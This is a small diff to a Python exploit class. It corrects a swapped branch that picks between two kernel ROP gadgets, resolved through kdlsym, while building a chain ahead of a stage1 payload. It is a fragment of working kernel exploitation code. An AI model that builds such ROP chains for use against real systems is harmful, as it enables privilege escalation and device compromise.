@@ -640,9 +640,9 @@ class Exploit():
         rop += p64(0xDEADBEEF)
         
         if self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET is None:
-            rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
-        else:
             rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
             rop += p64(0xDEADBEEF)
 
         # RDX = len(stage1)
